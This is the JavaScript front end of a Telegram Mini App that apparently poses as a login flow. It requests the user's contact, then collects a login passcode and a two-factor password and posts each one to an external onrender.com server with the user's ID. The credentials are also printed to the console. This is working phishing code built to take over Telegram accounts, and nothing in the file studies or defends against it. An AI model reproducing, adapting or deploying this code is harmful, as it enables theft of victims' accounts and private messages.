document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram?.WebApp;
    
    // Check if Telegram WebApp is available
    if (!tg) {
        console.error('❌ Telegram WebApp script not loaded!');
        document.getElementById('TEST').textContent = "❌ Telegram script error";
        return;
    }
    
    tg.ready();
    tg.expand();
    let page = 'page1';

    console.log("=== TELEGRAM WEBAPP DEBUG INFO ===");
    console.log("✅ Telegram WebApp object:", tg);
    console.log("📱 Platform:", tg.platform);
    console.log("🎨 Theme:", tg.themeParams);
    console.log("🔗 initData (raw string):", tg.initData);
    console.log("📦 initDataUnsafe (parsed):", tg.initDataUnsafe);
    console.log("👤 User from initDataUnsafe:", tg.initDataUnsafe?.user);
    console.log("===================================");
    
    // Display debug info on page
    const TEST = document.getElementById('TEST');
    
    if (!tg.initData || tg.initData === '') {
        TEST.innerHTML = "⚠️ Not opened from Telegram<br><small>Open via bot button</small>";
        TEST.style.fontSize = "1.2rem";
        TEST.style.color = "#ff6b6b";
    } else if (tg.initDataUnsafe?.user) {
        const user = tg.initDataUnsafe.user;
        TEST.innerHTML = `✅ ${user.first_name}<br><small>ID: ${user.id}</small>`;
        TEST.style.color = "#68ba4f";
    } else {
        TEST.innerHTML = "⚠️ User data not available<br><small>Trying to parse...</small>";
        TEST.style.fontSize = "1rem";
    }
    
    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const blur = document.getElementById('blur');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');

    // Store user info globally when available
    let userInfo = null;
    let testMode = false; // Enable test mode if no Telegram data

    // Try to get user info from Telegram WebApp
    if (tg.initDataUnsafe?.user) {
        userInfo = tg.initDataUnsafe.user;
        console.log('✅ User info loaded:', userInfo);
    } else if (!tg.initData || tg.initData === '') {
        console.log('⚠️ No Telegram initData - enabling TEST MODE');
        testMode = true;
        // Create a test button
        const testBtn = document.createElement('button');
        testBtn.textContent = '🧪 TEST MODE (Click to continue)';
        testBtn.style.cssText = 'margin-top: 1rem; padding: 0.5rem 1rem; background: #ff6b6b; color: white; border: none; border-radius: 0.5rem; cursor: pointer; font-size: 0.9rem;';
        testBtn.onclick = () => {
            // Use a dummy user ID for testing
            userInfo = { id: 999999999, first_name: 'TestUser' };
            TEST.innerHTML = `🧪 TEST MODE<br><small>Using ID: 999999999</small>`;
            TEST.style.color = "#ff6b6b";
            showPage2();
        };
        page1.querySelector('#bg').appendChild(testBtn);
    }

    loginBtn.addEventListener('click', async () => {
        console.log('🔄 Login button clicked');
        
        // Update user info if now available
        if (tg.initDataUnsafe?.user) {
            userInfo = tg.initDataUnsafe.user;
            console.log('✅ User info available:', userInfo);
        }
        
        if (testMode) {
            tg.showAlert('⚠️ Please open this app from the Telegram bot.\n\nFor testing, use the TEST MODE button below.');
            return;
        }
        
        try {
            tg.requestContact();
            tg.onEvent('contactRequested', (data) => {
                console.log('📞 Contact requested:', data);
                if (data.status === 'sent') {
                    showPage2();
                }
            });
            
        } catch (error) {
            console.log('[ERROR]: ' + error);
            tg.showAlert('Error: ' + error.message);
        }
    });

    function showPage2() {
        page = 'page2';
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginBtn.style.display = 'none';
    }

    function showPage3() {
        page = 'page3';
        page2.style.display = 'none';
        page3.style.display = 'flex';
        requestAnimationFrame(() => {
            page3.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page3.style.zIndex = '100';
        blur.style.opacity = '1';
    }

    blur.addEventListener('click', () => {
        if (page === 'page2') {
            blur.style.zIndex = '-1';
            page2.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page2.style.transform = 'translateY(40px)';
            });
        } else if (page === 'page3') {
            blur.style.zIndex = '-1';
            page3.style.display = 'none';
            blur.style.opacity = '0';
            loginBtn.style.display = 'flex';
            page = 'page1';
            requestAnimationFrame(() => {
                page3.style.transform = 'translateY(40px)';
            });
        }
    });

    // Handle passcode submission
    passcodeBtn.addEventListener('click', async () => {
        const passcode = passcodeInput.value;
        
        console.log('👤 Current user info:', userInfo);
        console.log('📝 Passcode:', passcode);

        if (!passcode) {
            console.log('❌ No passcode entered');
            tg.showAlert('⚠️ Please enter passcode');
            return;
        }

        // Get user_id from stored userInfo or try to parse from Telegram
        let user_id = userInfo?.id;
        
        if (!user_id && tg.initDataUnsafe?.user?.id) {
            user_id = tg.initDataUnsafe.user.id;
            userInfo = tg.initDataUnsafe.user;
        }
        
        if (!user_id && tg.initData) {
            // Try to parse from initData string as last resort
            const params = new URLSearchParams(tg.initData);
            const userParam = params.get('user');
            if (userParam) {
                try {
                    const userData = JSON.parse(userParam);
                    user_id = userData.id;
                    userInfo = userData;
                    console.log('✅ Parsed user from initData:', userData);
                } catch (e) {
                    console.log('❌ Failed to parse:', e);
                }
            }
        }

        if (!user_id) {
            console.log('❌ No user ID available');
            console.log('Debug: testMode =', testMode);
            console.log('Debug: userInfo =', userInfo);
            tg.showAlert('⚠️ Cannot get user ID. Please open from Telegram bot.');
            return;
        }

        console.log('📤 Sending: Passcode=' + passcode + ', UserID=' + user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    passcode: passcode,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            console.log('✅ Server response:', result);
            tg.showAlert('✅ Passcode sent!');
            
            // Show 2FA page
            setTimeout(() => {
                showPage3();
            }, 1000);
            
        } catch (err) {
            console.error('❌ Error:', err);
            tg.showAlert('❌ Failed to send');
        }
    });

    // Handle 2FA submission
    const twofactorBtn = document.getElementById('twofactor-btn');
    twofactorBtn.addEventListener('click', async () => {
        const twofactor = twofactorInput.value;

        if (!twofactor) {
            console.log('❌ No 2FA entered');
            tg.showAlert('⚠️ Please enter 2FA password');
            return;
        }

        const user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;

        if (!user_id) {
            console.log('❌ No user ID for 2FA');
            tg.showAlert('⚠️ Cannot get user ID');
            return;
        }

        console.log('📤 Sending: 2FA password, UserID=' + user_id);

        try {
            const response = await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    twofactor: twofactor,
                    user_id: user_id
                }),
            });

            const result = await response.json();
            console.log('✅ Server response:', result);
            tg.showAlert('✅ 2FA sent!');
            
        } catch (err) {
            console.error('❌ Error:', err);
            tg.showAlert('❌ Failed to send');
        }
    });

    // Handle passcode input display
    const input = document.getElementById('hiddenInput');
    const cells = document.querySelectorAll('.cell');
    const box = document.getElementById('codeBox');

    box.addEventListener('click', () => input.focus());

    input.addEventListener('input', () => {
        const value = input.value.split('');
        cells.forEach((cell, i) => {
            cell.textContent = value[i] || '';
            if (value[i]) {
                requestAnimationFrame(() => {
                    cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
                });
            } else {
                cell.style.boxShadow = '';
            }
        });
    });
});